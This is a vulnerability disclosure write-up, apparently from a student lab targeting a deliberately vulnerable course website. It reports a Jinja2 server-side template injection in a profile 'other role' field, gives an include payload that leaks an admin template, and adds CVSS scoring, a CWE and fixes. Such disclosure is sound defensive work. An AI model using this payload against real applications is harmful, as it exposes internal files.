# Server Side Template Injection (SSTI)

## Grupo 7

### Description

An SSTI vulnerability was identified in the **other role** field of the profile settings form on Grupo 7's website (http://social-book-goat-7.deti/profile-settings).

URL: http://social-book-goat-7.deti/profile-settings?username=admin

For a given username, specified via a query parameter, the profile settings form allows users to configure additional roles for their account. One of these fields, **other role**, is used to add extra roles dynamically to the profile:

![profile settings page](writeup1.PNG)

However, when a specific template expression is injected into the **other role** field, the application displays an error page revealing the application stack trace.

![error page revealing stack trace](writeup2.PNG)

Upon inspecting the error page, we found a vulnerable snippet of code within Grupo 7's ```/app/views.py``` file, where the exception occurred:

![vulnerable code snippet](writeup3.PNG)

### Proof of Concept

In its current state, the vulnerability allows an attacker to inject a template expression directly into the **other role** field. This injection causes the Jinja2 template engine to process the injected content, leading to file inclusion on the server. The payload successfully rendered is:

```jinja
{% include 'admin/base.html' %}
```

This payload demonstrates the ability to include an internal file on the server, in this case, **admin/base.html**. The contents of the file, which is part of the admin UI, are revealed to the attacker:

```html
<!DOCTYPE html>
<html lang="en-us" dir="ltr">
<head>
  <title></title>
  <link rel="stylesheet" href="/static/admin/css/base.css">
  <link rel="stylesheet" href="/static/admin/css/dark_mode.css">
  <meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <link rel="stylesheet" href="/static/admin/css/responsive.css">
  <meta name="robots" content="NONE,NOARCHIVE">
</head>
<body class="" data-admin-utc-offset="0">
  <!-- Container -->
  <div id="container">
    <!-- Header -->
    <div id="header">
      <div id="branding">
      </div>
    </div>
    <!-- END Header -->
    <div class="breadcrumbs">
      <a href="/admin/">Home</a>
    </div>
    <div class="main" id="main">
      <div class="content">
        <!-- Content -->
        <div id="content" class="colM">
          <br class="clear">
        </div>
        <!-- END Content -->
        <div id="footer"></div>
      </div>
    </div>
  </div>
  <!-- END Container -->
</body>
</html>
```

This file inclusion provides insight into the admin UI structure, revealing paths to static resources, like CSS files. These file paths could not be included in a similar manner to ```admin/base.html``` as an "Internal server error" response was returned.

It’s important to note that other attempts to inject different payloads either yielded an empty response or resulted in an internal server error, indicating that file inclusion is the primary attack vector currently exploitable in this instance.

### Impact

The SSTI vulnerability on Grupo 7's platform can be exploited to **disclose sensitive internal files** by injecting arbitrary template tags. The immediate impact is limited to **information disclosure** (unauthorized access to internal files such as HTML templates and static resources).

While this vulnerability does not directly allow **data modification** (such as inserting or deleting data from the database), it presents a **confidentiality** risk. The revealed content may aid an attacker in crafting further attacks or identifying additional vulnerabilities. For example:

1. **Internal HTML template files**: Exposes the structure of the admin panel.
2. **Paths to static resources**: Reveals paths to potential assets or additional configuration files that could be misused.

While the current disclosure may seem relatively benign, an attacker could use this information to further probe the application for additional weaknesses, especially in combination with other attacks.

### CVSS

**Score:** 7.5

**Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

**Note:** The confidentiality impact is high due to the possibility of unauthorized file inclusion and exposure. Although the integrity and availability impacts are low, the ability to disclose sensitive data remains a significant risk.

![Graph overview](writeup5.PNG)

### CWE

**CWE-98: Improper Control of Generation of Code ('Code Injection')**

The application improperly handles user input within the template system, allowing an attacker to inject arbitrary code into the server's template engine, potentially causing unauthorized execution of sensitive code.

### Recommendations

- **Input Validation**: Properly validate and sanitize all user inputs to ensure they do not contain template syntax or characters that can trigger template rendering.
- **Template Context Control**: Avoid allowing user-controlled data to be directly rendered by the template engine. If dynamic template inclusion is necessary, use strict whitelisting of file names.
- **Use Safe Methods for File Inclusion**: Replace the raw template inclusion mechanism with safer methods that explicitly validate paths or restrict the inclusion to specific trusted files.